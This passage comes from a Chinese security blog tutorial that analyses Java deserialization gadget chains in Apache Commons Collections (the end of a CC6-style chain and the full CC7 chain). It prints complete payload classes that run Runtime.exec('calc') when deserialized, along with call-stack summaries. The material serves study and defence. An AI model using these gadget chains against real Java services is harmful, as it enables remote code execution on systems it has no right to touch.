方法执行 LazyMap 的 get 方法</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 利用 BadAttributeValueExpException 的 readObject 方法执行 TiedMapEntry 的 toString 方法</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">        // 反射设置 val ，不在构造方法中设置 val 是为了避免提前代码执行</span><br><span class="line">        Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="CC7-链"><a href="#CC7-链" class="headerlink" title="CC7 链"></a>CC7 链</h2><p>CC7 链将 Hashtable#readObject() 作为入口，利用 AbstractMap#equals() 来调用 LazyMap#get() ，进而调用 transform 方法。</p>
-<h3 id="利用链之-AbstractMap"><a href="#利用链之-AbstractMap" class="headerlink" title="利用链之 AbstractMap"></a>利用链之 AbstractMap</h3><p>AbstractMap 的 equals 方法调用了 m 的 get 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object o) &#123;</span><br><span class="line">    if (o == this)</span><br><span class="line">        return true;</span><br><span class="line"></span><br><span class="line">    if (!(o instanceof Map))</span><br><span class="line">        return false;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    if (m.size() != size())</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        while (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            if (value == null) &#123;</span><br><span class="line">                if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (!value.equals(m.get(key)))</span><br><span class="line">                    return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (ClassCastException unused) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; catch (NullPointerException unused) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>来看 m 在 equals 方法中的定义：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br></pre></td></tr></table></figure>
-
-<p>所以只要将传入的 o 设置成 LazyMap 对象就好了。</p>
-<h3 id="利用链之-AbstractMapDecorator"><a href="#利用链之-AbstractMapDecorator" class="headerlink" title="利用链之 AbstractMapDecorator"></a>利用链之 AbstractMapDecorator</h3><p>AbstractMapDecorator 的 equals 方法会调用 map 的 equals 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object object) &#123;</span><br><span class="line">    if (object == this) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>map 是 AbstractMapDecorator 中定义的成员属性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected transient Map map;</span><br></pre></td></tr></table></figure>
-
-<p>在构造方法中被赋值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public AbstractMapDecorator(Map map) &#123;</span><br><span class="line">    if (map == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;Map must not be null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    this.map = map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以将 map 赋值成 AbstractMap 对象。</p>
-<h3 id="入口类之-Hashtable"><a href="#入口类之-Hashtable" class="headerlink" title="入口类之 Hashtable"></a>入口类之 Hashtable</h3><p>Hashtable 的 reconstitutionPut 方法调用了 e.key.equals() ：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br><span class="line">    throws StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    if (value == null) &#123;</span><br><span class="line">        throw new java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    // Makes sure the key is not already in the hashtable.</span><br><span class="line">    // This should not happen in deserialized version.</span><br><span class="line">    int hash = key.hashCode();</span><br><span class="line">    int index = (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line">    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;</span><br><span class="line">        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            throw new java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // Creates the new entry.</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = new Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里需要注意几个点：</p>
-<p>一是 value 需要不为空，否则抛出异常；</p>
-<p>二是 for 循环中的 if 判断条件 (e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key) ，使用 &amp;&amp; 符号，具有短路特性，也就是说只有左边的式子返回 true ，右边的式子才会执行。</p>
-<p>Hashtable 的 value 属性可以通过 put 方法赋值；</p>
-<p>要调用到 e.key.equals() 我们需要保证 e.key 是一个 AbstractMapDecorator 对象，但是 AbstractMapDecorator 是一个抽象类，并不能直接 new 对象，已知 LazyMap 继承了 AbstractMapDecorator 这个抽象类，所以可以考虑将 e.key 赋值为 LazyMap 对象；</p>
-<p>e 是传入的参数 Entry<?,?>[] tab 数组的某一个键值对，想知道这个 tab 是什么，还得往后看。</p>
-<p>Hashtable 的 readObject 方法调用了 reconstitutionPut 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">     throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    // Read in the length, threshold, and loadfactor</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Read the original length of the array and number of elements</span><br><span class="line">    int origlength = s.readInt();</span><br><span class="line">    int elements = s.readInt();</span><br><span class="line"></span><br><span class="line">    // Compute new size with a bit of room 5% to grow but</span><br><span class="line">    // no larger than the original size.  Make the length</span><br><span class="line">    // odd if it&#x27;s large enough, this helps distribute the entries.</span><br><span class="line">    // Guard against the length ending up zero, that&#x27;s not valid.</span><br><span class="line">    int length = (int)(elements * loadFactor) + (elements / 20) + 3;</span><br><span class="line">    if (length &gt; elements &amp;&amp; (length &amp; 1) == 0)</span><br><span class="line">        length--;</span><br><span class="line">    if (origlength &gt; 0 &amp;&amp; length &gt; origlength)</span><br><span class="line">        length = origlength;</span><br><span class="line">    table = new Entry&lt;?,?&gt;[length];</span><br><span class="line">    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);</span><br><span class="line">    count = 0;</span><br><span class="line"></span><br><span class="line">    // Read the number of elements and then all the key/value objects</span><br><span class="line">    for (; elements &gt; 0; elements--) &#123;</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">            K key = (K)s.readObject();</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">            V value = (V)s.readObject();</span><br><span class="line">        // synch could be eliminated for performance</span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到传入 reconstitutionPut 方法的第一个参数是 table ，table 是 Hashtable 中定义的一个属性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private transient Entry&lt;?,?&gt;[] table;</span><br></pre></td></tr></table></figure>
-
-<p>这个属性被 transient 修饰，不能参加序列化，也就是说反序列化通过 Hashtable 的 readObject 方法第一次调用 reconstitutionPut 方法时，table 至少是没有值的。</p>
-<p>再放一遍 reconstitutionPut 代码：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240603145606511.png">
-
-<p>回到前面的问题，第一次调用 reconstitutionPut 方法时 table 为空，故而 for 循环中取到的 e 为空，直接跳出 for 循环，进行后面的赋值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">tab[index] = new Entry&lt;&gt;(hash, key, value, e);</span><br></pre></td></tr></table></figure>
-
-<p>这里调用了 Entry 的构造方法，会将其成员属性 hash 赋值为前面调用 key.hashCode() 算出来的 hash 值。</p>
-<p>Entry 是 Hashtable 中的一个静态内部类，其构造方法如下：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240603144348816.png">
-
-<p>第一次 reconstitutionPut 方法被调用完后，会回到 readObject 方法的循环中，Hashtable 中的键值对有多少个，这个 for 循环就执行多少次，reconstitutionPut 方法就被调用多少次，那么如果在 Hashtable 中放入两个 LazyMap 对象：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashtable.put(lazyMap1, &quot;test&quot;);</span><br><span class="line">hashtable.put(lazyMap2, &quot;test&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>reconstitutionPut 方法自然会执行两次，第二次调用时，tab[index] 就有值了，且只有一个值，就是 lazyMap1 &#x3D;&gt; “test” ，我们又知道，hash 是调用 key.hashCode() 得到的，lazyMap1.hashCode() 会调用其父类 AbstractMapDecorator 的 hashCode() 方法，并最终会调用其成员属性 map 的 hashCode() 方法。</p>
-<p>若 map 是 HashMap 对象，则会调用 HashMap 的 hashCode() 方法，这个方法在其静态内部类 Node&lt;K,V&gt; 中：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public final int hashCode() &#123;</span><br><span class="line">    return Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，HashMap 的 hashCode() 方法是分别计算其 key 的 hash 和 value 的 hash 再相乘得到的。</p>
-<p>接下来需要使判断 <code>e.hash == hash</code> 返回 true ，即使 <code>lazyMap1.hashCode() == lazyMap2.hashCode()</code> 成立。但是 lazyMap1 与 lazyMap2 又不能完全一样，因为 hashtable.put 在往 hashtable 对象里添加键值对的时候，如果键一样的话，会将值替换掉，如果 lazyMap1 与 lazyMap2 完全一样，那么第二个 put 就只会做替换，这样 hashtable 对象里面就仍然只有一个键值对。</p>
-<p> 所以这里我们沿用前辈们的思路：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazyMap1.put(&quot;yy&quot;, 1);</span><br><span class="line">lazyMap2.put(&quot;zZ&quot;, 1);</span><br></pre></td></tr></table></figure>
-
-<p>由于 “yy” 与 “zZ” 算出来的 hash 值一样，所以这样设置好两个 LazyMap 对象中的 map 属性之后，hashCode() 方法得出来的结果是一样的。</p>
-<p>最后一点就是，hashtable 的 put 方法会提前调用 equals 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public synchronized V put(K key, V value) &#123;</span><br><span class="line">    // Make sure the value is not null</span><br><span class="line">    if (value == null) &#123;</span><br><span class="line">        throw new NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Makes sure the key is not already in the hashtable.</span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    int hash = key.hashCode();</span><br><span class="line">    int index = (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    for(; entry != null ; entry = entry.next) &#123;</span><br><span class="line">        if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            V old = entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            return old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>仔细观察上述代码，发现跟 reconstitutionPut 方法很像，所以为了防止提前命令执行，先传入一个空的 Transformer 到 LazyMap 即可。</p>
-<p>有了上述的结论，就可以开始书写 payload 了。</p>
-<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC7 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 利用 ChainedTransformer 执行 Runtime.getRuntime.exec(&quot;calc&quot;)</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        // 先传入空的 Transformer 数组，防止 put 时命令执行</span><br><span class="line">        Transformer[] transformers1 = new Transformer[]&#123;&#125;;</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers1);</span><br><span class="line"></span><br><span class="line">        // 新建两个 HashMap 作为传入的参数</span><br><span class="line">        Map innerMap1 = new HashMap();</span><br><span class="line">        Map innerMap2 = new HashMap();</span><br><span class="line"></span><br><span class="line">        // 新建两个 LazyMap ，确保 hashCode() 结果一样</span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(&quot;yy&quot;, 1);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(&quot;zZ&quot;, 1);</span><br><span class="line"></span><br><span class="line">        // 新建入口类 Hashtable</span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, &quot;test1&quot;);</span><br><span class="line">        hashtable.put(lazyMap2, &quot;test2&quot;);</span><br><span class="line"></span><br><span class="line">        // 通过反射设置 transformer 数组</span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除</span><br><span class="line">        lazyMap2.remove(&quot;yy&quot;);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="调用栈总结-3"><a href="#调用栈总结-3" class="headerlink" title="调用栈总结"></a>调用栈总结</h3><p>梳理调用栈之前，先知道两件事：</p>
-<ul>
-<li>LazyMap 继承了 AbstractMapDecorator</li>
-<li>HashMap 继承了 AbstractMap</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Hashtable#readObject()</span><br><span class="line">	-&gt;Hashtable#reconstitutionPut()</span><br><span class="line">	-&gt;Hashtable#reconstitutionPut()</span><br><span class="line">		LazyMap#equals() -- 即 AbstractMapDecorator#equals()</span><br><span class="line">			HashMap#equals() -- 即 AbstractMap#equals()</span><br><span class="line">				LazyMap#get()</span><br><span class="line">					ChainedTransformer#transform()</span><br><span class="line">						InvokerTransformer#transform()</span><br><span class="line">                        	Runtime#exec()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9409?time__1311=n4+xuDgD9AYCqAKGQ3DsD7feyK4AxxnAxbD&alichlgref=https://www.google.com/">CC链 1-7 分析</a> </p>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#CUjq4">https://www.yuque.com/5tooc3a/jas/gggdt0vwi5n0zwhr#CUjq4</a></p>
-
-
-</article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/">漏洞篇 - Rome 链之 HotSwappableTargetSource 利用链</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/05/27/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC3%E9%93%BE%E5%88%86%E6%9E%90/">漏洞篇 - Java 反序列化之 CC3 链</a></div></section></div>
-
-
-
-
-
-
-<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
-</div></footer>
-<div class='float-panel mobile-only blur' style='display:none'>
-  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
-  </button>
-</div>
-<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
-<script type="text/javascript">
-  const stellar = {
-    // 懒加载 css https://github.com/filamentgroup/loadCSS
-    loadCSS: (href, before, media, attributes) => {
-      var doc = window.document;
-      var ss = doc.createElement("link");
-      var ref;
-      if (before) {
-        ref = before;
-      } else {
-        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
-        ref = refs[refs.length - 1];
-      }
-      var sheets = doc.styleSheets;
-      if (attributes) {
-        for (var attributeName in attributes) {
-          if (attributes.hasOwnProperty(attributeName)) {
-            ss.setAttribute(attributeName, attributes[attributeName]);
-          }
-        }
-      }
-      ss.rel = "stylesheet";
-      ss.href = href;
-      ss.media = "only x";
-      function ready(cb) {
-        if (doc.body) {
-          return cb();
-        }
-        setTimeout(function () {
-          ready(cb);
-        });
-      }
-      ready(function () {
-        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
-      });
-      var onloadcssdefined = function (cb) {
-        var resolvedHref = ss.href;
-        var i = sheets.length;
-        while (i--) {
-          if (sheets[i].href === resolvedHref) {
-            return cb();
-          }
-        }
-        setTimeout(function () {
-          onloadcssdefined(cb);
-        });
-      };
-      function loadCB() {
-        if (ss.addEventListener) {
-          ss.removeEventListener("load", loadCB);
-        }
-        ss.media = media || "all";
-      }
-      if (ss.addEventListener) {
-        ss.addEventListener("load", loadCB);
-      }
-      ss.onloadcssdefined = onloadcssdefined;
-      onloadcssdefined(loadCB);
-      return ss;
-    },
-
-    // 从 butterfly 和 volantis 获得灵感
-    loadScript: (src, opt) => new Promise((resolve, reject) => {
-      var script = document.createElement('script');
-      if (src.startsWith('/')){
-        src = stellar.config.root + src.substring(1);
-      }
-      script.src = src;
-      if (opt) {
-        for (let key of Object.keys(opt)) {
-          script[key] = opt[key]
-        }
-      } else {
-        // 默认异步，如果需要同步，第二个参数传入 {} 即可
-        script.async = true
-      }
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    }),
-
-    // https://github.com/jerryc127/hexo-theme-butterfly
-    jQuery: (fn) => {
-      if (typeof jQuery === 'undefined') {
-        stellar.loadScript(stellar.plugins.jQuery).then(fn)
-      } else {
-        fn()
-      }
-    }
-  };
-  stellar.version = '1.26.8';
-  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
-  stellar.config = {
-    date_suffix: {
-      just: '刚刚',
-      min: '分钟前',
-      hour: '小时前',
-      day: '天前',
-      month: '个月前',
-    },
-    root : '/',
-  };
-
-  // required plugins (only load if needs)
-  stellar.plugins = {
-    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
-  };
-
-  if ('local_search') {
-    stellar.search = {};
-    stellar.search.service = 'local_search';
-    if (stellar.search.service == 'local_search') {
-      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
-      stellar.search[stellar.search.service] = service_obj;
-    }
+.l_body {
+  display: flex;
+  margin: auto;
+  padding: 0 var(--gap-l);
+  justify-content: center;
+  font-size: var(--fsp);
+}
